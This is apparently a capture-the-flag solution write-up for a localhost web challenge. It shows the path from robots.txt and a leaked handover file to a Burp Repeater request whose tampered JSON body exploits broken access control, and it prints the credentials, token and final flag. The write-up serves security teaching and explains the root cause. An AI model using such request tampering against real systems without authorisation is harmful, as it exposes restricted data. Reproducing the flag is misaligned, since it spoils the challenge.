# Solution: Deleted Confessions

## Challenge Details

- **Category:** Web
- **Author:** Mujabeast
- **Difficulty:** 2/5
- **Local URL:** `http://localhost:5000`

## What This Challenge Tests

This challenge is a short chain of common web-application observations:

1. Finding non-linked pages through `robots.txt`.
2. Recognising a JWT and reading its Base64URL-encoded payload.
3. Using exposed test credentials to enter a low-privilege account.
4. Intercepting a browser request with Burp Suite.
5. Exploiting broken access control by changing client-controlled request values.

The JWT is **not** a login token that needs to be forged or modified. It is simply a leaked debug artifact that tells the player which restricted confession and visibility value to request.

## Full Intended Solve Path

```text
Homepage
  -> robots.txt
  -> /confession-archive/
  -> moderator_handover.txt
  -> decode the debug JWT
  -> obtain confession-6701 and moderator-only
  -> log in as sleepy.mod
  -> intercept a normal Review request in Burp Suite
  -> replace the confession ID and visibility fields
  -> receive the restricted confession and flag
```

## Step 1: Inspect The Homepage

Open the challenge URL in a browser:

```text
http://localhost:5000
```

The page is a fictional public feed called **NUT Confessions Live**. It contains only ordinary anonymous posts. At the bottom of the feed, there is an important line:

```text
Some posts may be automatically hidden by the moderation system.
```

This does not directly reveal the flag, but it suggests that the application has moderation-related content which is not visible on the public feed.

## Step 2: Check `robots.txt`

Many websites provide a `robots.txt` file at the website root. Search engines use it for crawl guidance, but it is still publicly readable by anyone.

Manually append `/robots.txt` to the challenge URL:

```text
http://localhost:5000/robots.txt
```

The page returns:

```text
User-agent: *
Disallow: /moderator-preview/
Disallow: /confession-archive/
```

![The challenge's robots.txt output](images/01-robots.txt.png)

`Disallow` does **not** protect a route. It only asks compliant search engines not to crawl it. A player can still visit either route directly.

## Step 3: Check The Discovered Routes

First, open the moderator preview route:

```text
http://localhost:5000/moderator-preview/
```

It is only a joke page and has no useful data.

Next, open the archive route:

```text
http://localhost:5000/confession-archive/
```

This page lists several public exports. Download or open:

```text
moderator_handover.txt
```

## Step 4: Read The Moderator Handover Note

The handover note contains a temporary moderation account:

```text
Username: sleepy.mod
Password: OneMoreDeadline!
```

It also contains a long value labelled **Temporary moderation debug token**:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb25mZXNzaW9uX2lkIjoiY29uZmVzc2lvbi02NzAxIiwidmlzaWJpbGl0eSI6Im1vZGVyYXRvci1vbmx5In0.c2VudGN0Zi1kZWJ1Zy1zaWduYXR1cmU
```

## Step 5: Decode The JWT

1. Open a JWT decoder such as `https://jwt.io/`.
2. Paste the full token into the **Encoded** field.
3. Read the decoded **Payload** section.
4. Do not attempt to change or re-sign the token. The challenge only requires reading it.

The payload is:

```json
{
  "confession_id": "confession-6701",
  "visibility": "moderator-only"
}
```

![A JWT decoder displaying the readable header and payload](images/02-jwt-decoder.png)

## Step 6: Log In As The Junior Moderator

Open the login page:

```text
http://localhost:5000/moderator-login
```

Enter the credentials from the handover file:

```text
Username: sleepy.mod
Password: OneMoreDeadline!
```

Successful login leads to a confirmation page. Select **Open moderation dashboard**.

The dashboard identifies the account as:

```text
Role: Junior Moderator
```

It displays only public reported confessions. This is important: the account should not normally have access to senior-moderator content.

## Step 7: Observe A Normal Review Request

Each visible report has a **Review** button. The button sends a JSON request to the API.

For example, reviewing Confession #5012 normally sends:

```http
POST /api/confession/view HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=...

{
  "confession_id": "confession-5012",
  "visibility": "public"
}
```

The server returns the selected public confession. This establishes the field names and the expected JSON structure.

## Step 8: Intercept The Request In Burp Suite

Use Burp Suite's built-in browser for the simplest setup:

1. Open Burp Suite.
2. Open **Proxy** and ensure the listener is running.
3. Click **Open Browser** in Burp Suite.
4. In the Burp browser, visit `http://localhost:5000`.
5. Repeat the earlier discovery and login steps in this browser so it receives the moderator session cookie.
6. In Burp Suite, open **Proxy** > **Intercept** and turn interception on.
7. Return to the moderator dashboard in the Burp browser.
8. Click **Review** on any visible report.

Burp pauses the outgoing `POST /api/confession/view` request. Do not use **Forward** yet.

Right-click the captured request and choose **Send to Repeater**. Then turn interception off, so the browser is not left waiting for later requests.

## Step 9: Tamper With The Request In Repeater

Open the **Repeater** tab. Keep these parts of the captured request unchanged:

- The request method: `POST`
- The path: `/api/confession/view`
- The `Content-Type: application/json` header
- The `Cookie: session=...` header

Replace the entire JSON body with the payload decoded from the JWT:

```json
{
  "confession_id": "confession-6701",
  "visibility": "moderator-only"
}
```

Click **Send**.

![Burp Repeater sending the modified request and receiving the restricted confession](images/03-burp-repeater.png)

## Step 10: Read The Restricted Confession

The API incorrectly trusts the values supplied by the browser. It does not verify that the signed-in user is a Senior Moderator before returning the requested record.

The response includes:

```json
{
  "id": "confession-6701",
  "visibility": "Senior Moderators Only",
  "status": "Removed",
  "body": "I have a confession. ...",
  "flag": "sentctf{c0nf35510n_r3qu35t_1nt3rc3pt3d}"
}
```

Submit the value of the `flag` field.

## Final Flag

```text
sentctf{c0nf35510n_r3qu35t_1nt3rc3pt3d}
```

## Root Cause

The vulnerability is **broken access control**. The server uses this unsafe logic:

```text
If the browser asks for confession-6701 with moderator-only visibility,
return it.
```

It should instead derive what the user may access from the server-side session and reject requests for senior-only records from `sleepy.mod`.

## Hints

1. beep boop
2. https://portswigger.net/web-security/jwt

## Notes For Reviewers

The application is deliberately vulnerable only inside this isolated CTF container. It is fully fictional and includes a disclaimer on every page. The intended path requires no automated scanning and very little request traffic.
